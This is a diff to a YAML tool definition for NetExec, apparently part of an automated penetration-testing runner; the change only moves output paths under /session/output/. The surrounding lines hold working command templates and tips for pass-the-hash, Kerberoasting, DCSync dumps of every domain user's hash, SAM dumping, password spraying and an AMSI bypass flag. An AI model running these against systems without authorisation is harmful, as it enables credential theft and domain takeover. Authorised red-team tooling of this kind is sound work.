@@ -264,7 +264,7 @@ usage_patterns:
     when: "Validate an NTLM hash via pass-the-hash, enumerate shares, and dump local SAM hashes if admin. Format: -H 31d6cfe0d16ae931b73c59d7e0c089c0 (bare NT) or -H aad3b435...:31d6cfe0... (LM:NT). --sam silently no-ops without admin — check for (Pwn3d!) marker first."
 
   - name: "LDAP Kerberoast against AD (Kerberos auth)"
-    command: "netexec ldap {dc_target} -u {username} -p '{password}' -k --kerberoasting /session/kerberoast.txt"
+    command: "netexec ldap {dc_target} -u {username} -p '{password}' -k --kerberoasting /session/output/kerberoast.txt"
     when: "Extract TGS hashes for SPN-bound accounts to crack offline. -k uses Kerberos via existing ccache (requires --use-kcache or KRB5CCNAME env). Output file lands in /session/ for hashcat -m 13100 / john --format=krb5tgs. Works on hardened AD where NTLM is disabled."
 
   - name: "MSSQL command exec via xp_cmdshell"
@@ -277,10 +277,10 @@ usage_patterns:
 
   - name: "NTDS dump from DC (DCSync)"
     command: "netexec smb {dc_target} -u {username} -p '{password}' --ntds"
-    when: "Dump every domain user's NT hash via DRSUAPI replication. Default method is drsuapi (--ntds drsuapi); --ntds vss is the fallback (Volume Shadow Copy) when drsuapi is blocked. Requires Domain Admin or 'Replicating Directory Changes' / 'All' rights. Output streams to stdout — capture via --log /session/ntds.log."
+    when: "Dump every domain user's NT hash via DRSUAPI replication. Default method is drsuapi (--ntds drsuapi); --ntds vss is the fallback (Volume Shadow Copy) when drsuapi is blocked. Requires Domain Admin or 'Replicating Directory Changes' / 'All' rights. Output streams to stdout — capture via --log /session/output/ntds.log."
 
   - name: "Module run (spider_plus for share content)"
-    command: "netexec smb {target} -u {username} -p '{password}' -M spider_plus -o EXT=txt,ini,config OUTPUT_FOLDER=/session/spider"
+    command: "netexec smb {target} -u {username} -p '{password}' -M spider_plus -o EXT=txt,ini,config OUTPUT_FOLDER=/session/output/spider"
     when: "Run a built-in module to enrich enumeration. spider_plus walks every readable share and writes a JSON inventory. -o passes module options as KEY=VALUE space-separated. Use `netexec smb -L` to list all available modules per protocol; `netexec smb -M <name> --module-options` shows a module's options."
 
   - name: "Subnet share enumeration (CIDR multi-target)"
@@ -375,8 +375,8 @@ gotchas:
   - "Authentication combinations: -u + -p (password), -u + -H (pass-the-hash), -u + -k (Kerberos via ccache), --no-pass (null session). Mixing them confuses netexec. --local-auth and -d are mutually exclusive."
   - "-x runs ONE command via SMB/WinRM/MSSQL/RDP/WMI; -X is PowerShell-specific. -X with --obfs adds basic obfuscation. AMSI bypass needs --amsi-bypass + a bypass payload file."
   - "--continue-on-success is REQUIRED for password spray. Default is STOP at first [+]. Without it, a successful auth on host[1] in a /24 means hosts [2..254] are NEVER tested. Counter-intuitive but documented."
-  - "When -p value is a file path (e.g., -p /session/wordlist.txt), netexec auto-detects file mode. If the file does NOT exist, the value is treated as a LITERAL password — leading to confusing failures. Always pre-verify the file path exists before running."
-  - "Output to /session/ — use --log /session/netexec.log for persistent capture. Hash extraction (--kerberoasting / --asreproast) takes a PATH argument, not a boolean."
+  - "When -p value is a file path (e.g., -p /session/output/wordlist.txt), netexec auto-detects file mode. If the file does NOT exist, the value is treated as a LITERAL password — leading to confusing failures. Always pre-verify the file path exists before running."
+  - "Output to /session/ — use --log /session/output/netexec.log for persistent capture. Hash extraction (--kerberoasting / --asreproast) takes a PATH argument, not a boolean."
   - "NTDS dump methods: --ntds drsuapi (default, DCSync via DRSUAPI RPC) vs --ntds vss (Volume Shadow Copy). drsuapi requires DRSUAPI replication rights on the DC. vss requires local admin on the DC + reachable SMB. Try drsuapi first; fall back to vss on STATUS_NOT_SUPPORTED."
   - "Modules (-M): each has its own option set. Use `netexec <protocol> -L` to list available modules. `netexec <protocol> -M <name> --module-options` shows a module's options. Module options pass via -o KEY=VALUE [KEY=VALUE ...]."
   - "NetExec WinRM does NOT support Kerberos — only NTLM. If the target has NTLM disabled (STATUS_NOT_SUPPORTED on WinRM), switch to evil-winrm (which supports KRB5CCNAME). This is a netexec limitation, not a target misconfig."
@@ -391,7 +391,7 @@ gotchas:
   - "Silent admin-required failure: when -x / -X / --sam / --lsa / --ntds / --dpapi / --kerberos-keys are requested but the user is NOT a local admin, netexec emits auth [+] (and possibly no (Pwn3d!) marker) followed by NO operation output and a zero exit code. Detect by checking that the requested admin op produced visible output AND that (Pwn3d!) appears on the auth line; otherwise treat as 'admin required'. Counter-intuitive — the [+] makes it look successful."
   - "`--kerberos-keys` requires `--ntds` as a parent flag — pass `--ntds drsuapi --kerberos-keys` together. netexec rejects `--kerberos-keys` standalone with an argparse error."
   - "Closed ports on mssql / ssh / rdp / winrm protocols can produce ZERO [+] / [-] markers (only [*] init banner) and zero exit code — distinct from `Connection refused`. If output has only [*] lines and no host markers, treat as a network-layer failure and verify the port with nmap."
-  - "Kerberos config file: when using -k, netexec reads /etc/krb5.conf. The legacy mcp-server.py copied /session/config/krb5.conf → /etc/krb5.conf on demand. Under kind:cli there is no wrapper — if KRB5_CONFIG is unset and /etc/krb5.conf doesn't reflect the target realm, GSSAPI may fail with KDC_ERR_S_PRINCIPAL_UNKNOWN even with a valid ccache. Workaround: pre-stage the krb5.conf in the container image, or set KRB5_CONFIG=/session/config/krb5.conf via env."
+  - "Kerberos config file: when using -k, netexec reads /etc/krb5.conf. The legacy mcp-server.py copied /session/output/config/krb5.conf → /etc/krb5.conf on demand. Under kind:cli there is no wrapper — if KRB5_CONFIG is unset and /etc/krb5.conf doesn't reflect the target realm, GSSAPI may fail with KDC_ERR_S_PRINCIPAL_UNKNOWN even with a valid ccache. Workaround: pre-stage the krb5.conf in the container image, or set KRB5_CONFIG=/session/output/config/krb5.conf via env."
   - "BloodHound / Kerberoasting / AS-REP roast operations are slow (5+ min on busy DCs). The default 120 s wrapper timeout was raised to 300 s in the legacy method handlers. With kind:cli the runner uses idle_timeout_seconds=600 and max_runtime_seconds=21600 — long quiet stretches are normal."
 
 failure_signatures:
